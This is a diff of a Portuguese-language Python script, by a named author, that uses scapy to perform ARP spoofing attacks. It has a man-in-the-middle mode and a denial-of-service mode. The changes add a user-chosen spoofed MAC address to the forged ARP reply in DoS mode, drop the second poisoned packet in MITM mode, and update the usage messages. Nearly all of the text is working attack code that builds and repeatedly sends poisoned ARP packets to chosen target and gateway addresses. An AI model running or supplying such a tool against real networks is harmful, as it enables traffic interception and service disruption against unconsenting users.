@@ -2,7 +2,7 @@
 
 # Autor: Pedro Otávio
 # Email: pedr_ofs@hotmail.com
-# Atualizado: 01/03/2022
+# Atualizado: 02/03/2022
 
 # Este script tem por finalidade realizar o ataques ARP Spoofing em uma rede.
 
@@ -23,15 +23,15 @@ from scapy.all import Ether,ARP,sendp
 if len(sys.argv) <= 2:
 
 	# Informa ao usuário o modo de uso do script.
-	print ("Modo de uso MITM:", sys.argv[0],"ip-alvo0 ip-alvo1")
-	print ("Modo de uso DoS:", sys.argv[0], "dos ip-alvo0 ip-gateway")
+	print ("Modo de uso MITM:", sys.argv[0],"[ip-alvo0] [ip-alvo1]")
+	print ("Modo de uso DoS:", sys.argv[0], "dos [ip-alvo0] [ip-gateway] [mac-spoof]")
 
 # Verifica se o usuário deseja efetuar o ataque de negação de serviço (DoS).
 elif sys.argv[1] == "dos":
 
 	# Verifica se o usuário entrou com o número de argumentos corretamente.
-	if len(sys.argv) <=3:
-		print ("Modo de uso DoS:", sys.argv[0], "dos ip-alvo ip-gateway")
+	if len(sys.argv) <=4:
+		print ("Modo de uso DoS:", sys.argv[0], "dos [ip-alvo] [ip-gateway] [mac-spoof]")
 
 	else:
 		# Utiliza a função get_mac_address para incluir o MAC do alvo na variável alvo_mac.
@@ -48,12 +48,13 @@ elif sys.argv[1] == "dos":
 		while gateway_mac == "00:00:00:00:00:00":
 			gateway_mac = get_mac_address(ip=sys.argv[3])
 
-		print ("MAC do alvo0:", alvo0_mac)
+		print ("\nMAC do alvo0:", alvo0_mac)
 		print ("MAC do gateway:", gateway_mac)
+		print ("MAC Spoof:", sys.argv[4])
 		print ("\nD0S 4TT4CK!\n£NV3NEN4ND0\n")
 
 		# Cria um pacote ARP com o endereço incorreto MAC do gateway.
-		pkt=Ether(dst=alvo0_mac , src=gateway_mac)/ARP(op=2 , hwsrc="aa:bb:cc:dd:ee:ff", hwdst=alvo0_mac , psrc=sys.argv[3] , pdst=sys.argv[2])
+		pkt=Ether(dst=alvo0_mac , src=gateway_mac)/ARP(op=2 , hwsrc=sys.argv[4], hwdst=alvo0_mac , psrc=sys.argv[3] , pdst=sys.argv[2])
 
 		#############################################################
 		# DICA: O campo "hwsrc" carrega o endereço MAC falsificado. #
@@ -99,7 +100,6 @@ else:
 
 	# Cria o pacote ARP Poisoning.
 	pkt=Ether(dst=alvo0_mac , src=alvo1_mac)/ARP(op=2 , hwsrc=atacante_mac, hwdst=alvo0_mac , psrc=sys.argv[2] , pdst=sys.argv[1])
-	pkt1=Ether(dst=alvo1_mac , src=alvo0_mac)/ARP(op=2 , hwsrc=alvo0_mac, hwdst=atacante_mac , psrc=sys.argv[1] , pdst=sys.argv[2])
 
 	# Tenta realizar uma tarefa.
 	try:
@@ -110,7 +110,7 @@ else:
 			# Ilustração dos pacotes enviados.
 			if (i % 2) == 0:
 
-				# Envia o pacote envenenado para o alvo 0.
+				# Envia o pacote envenenado para o alvo.
 				sendp(pkt, verbose=0)
 
 				# Ilustra o pacote 0.
@@ -120,8 +120,8 @@ else:
 				time.sleep(0.1)
 
 			else:
-				# Envia o pacote envenenado para o alvo 1.
-				sendp(pkt1, verbose=0)
+				# Envia o pacote envenenado para o alvo.
+				sendp(pkt, verbose=0)
 
 				# Ilustra o pacote 1.
 				print("1", end="", flush=True)
